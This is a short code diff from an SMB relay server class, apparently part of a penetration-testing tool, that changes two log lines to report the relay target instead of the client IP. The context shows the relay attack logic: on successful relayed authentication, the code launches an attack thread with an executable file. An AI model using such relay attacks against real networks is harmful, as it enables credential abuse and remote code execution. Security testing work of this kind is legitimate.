@@ -372,12 +372,12 @@ class SMBRelayServer:
                     packet['ErrorClass']  = errorCode & 0xff
                     # Reset the UID
                     smbClient.setUid(0)
-                    print "[!] Authenticating against %s as %s\%s FAILED" % (connData['ClientIP'],authenticateMessage['domain_name'], authenticateMessage['user_name'])
+                    print "[!] Authenticating against %s as %s\%s FAILED" % (self.target,authenticateMessage['domain_name'], authenticateMessage['user_name'])
                     #del (smbData[self.target])
                     return None, [packet], errorCode
                 else:
                     # We have a session, create a thread and do whatever we want
-                    print "[*] Authenticating against %s as %s\%s SUCCEED" % (connData['ClientIP'],authenticateMessage['domain_name'], authenticateMessage['user_name'])
+                    print "[*] Authenticating against %s as %s\%s SUCCEED" % (self.target,authenticateMessage['domain_name'], authenticateMessage['user_name'])
                     del (smbData[self.target])
                     clientThread = doAttack(smbClient,self.exeFile)
                     clientThread.start()
